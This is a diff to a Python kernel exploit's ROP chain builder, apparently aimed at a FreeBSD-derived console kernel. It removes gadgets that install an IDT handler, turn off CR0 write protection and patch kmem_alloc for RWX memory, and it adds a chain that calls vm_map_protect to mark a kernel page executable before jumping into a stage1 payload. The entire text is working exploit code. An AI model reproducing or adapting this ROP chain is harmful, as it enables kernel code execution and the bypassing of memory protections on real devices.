@@ -522,40 +522,6 @@ class Exploit():
     def build_second_rop(self):
         rop = bytearray()
 
-        # setidt(IDT_UD, handler, SDT_SYSIGT, SEL_KPL, 0)
-        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
-        rop += p64(IDT_UD)
-        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
-        rop += p64(self.kdlsym(self.offs.ADD_RSP_28_POP_RBP_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RDX_RET))
-        rop += p64(SDT_SYSIGT)
-        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(SEL_KPL)
-        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
-        rop += p64(0)
-        rop += p64(0xDEADBEEF)
-        rop += p64(self.kdlsym(self.offs.SETIDT))
-
-        # Disable write protection
-        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
-        rop += p64(CR0_ORI & ~CR0_WP)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
-
-        # Enable RWX in kmem_alloc
-        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
-        rop += p64(VM_PROT_ALL)
-        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH1))
-        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
-        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
-        rop += p64(self.kdlsym(self.offs.KMEM_ALLOC_PATCH2))
-        rop += p64(self.kdlsym(self.offs.MOV_BYTE_PTR_RCX_AL_RET))
-
-        # Restore write protection
-        rop += p64(self.kdlsym(self.offs.POP_RSI_RET))
-        rop += p64(CR0_ORI)
-        rop += p64(self.kdlsym(self.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET))
-
         # kmem_alloc(*kernel_map, PAGE_SIZE)
 
         # RDI = *kernel_map
@@ -601,6 +567,42 @@ class Exploit():
 
         # Call memcpy
         rop += p64(self.kdlsym(self.offs.MEMCPY))
+
+        # RDI = *kernel_map
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.RET))
+        rop += p64(self.kdlsym(self.offs.POP_RDI_RET))
+        rop += p64(self.kdlsym(self.offs.KERNEL_MAP))
+        rop += p64(self.kdlsym(self.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX))
+        rop += p64(0xDEADBEEF)
+
+        # RSI = R14
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.MOV_RSI_R14_CALL_RAX))
+
+        # RDX = R14
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(self.kdlsym(self.offs.MOV_RDX_R14_CALL_RAX))
+
+        # RDX = RDX + PAGE_SIZE
+        rop += p64(self.kdlsym(self.offs.POP_RAX_RET))
+        rop += p64(PAGE_SIZE)
+        rop += p64(self.kdlsym(self.offs.ADD_RDX_RAX_XOR_EAX_EAX_CMP_ECX_A_CMOVBE_RAX_RDX_POP_RBP_RET))
+        rop += p64(0xDEADBEEF)
+
+        # RCX = VM_PROT_ALL
+        rop += p64(self.kdlsym(self.offs.POP_RCX_RET))
+        rop += p64(VM_PROT_ALL)
+
+        # R8 = 1
+        rop += p64(self.kdlsym(self.offs.POP_R8_POP_RBP_RET))
+        rop += p64(1)
+        rop += p64(0xDEADBEEF)
+
+        # Call vm_map_protect
+        rop += p64(self.kdlsym(self.offs.VM_MAP_PROTECT))
 
         # Jump into stage1
         rop += p64(self.kdlsym(self.offs.JMP_R14))
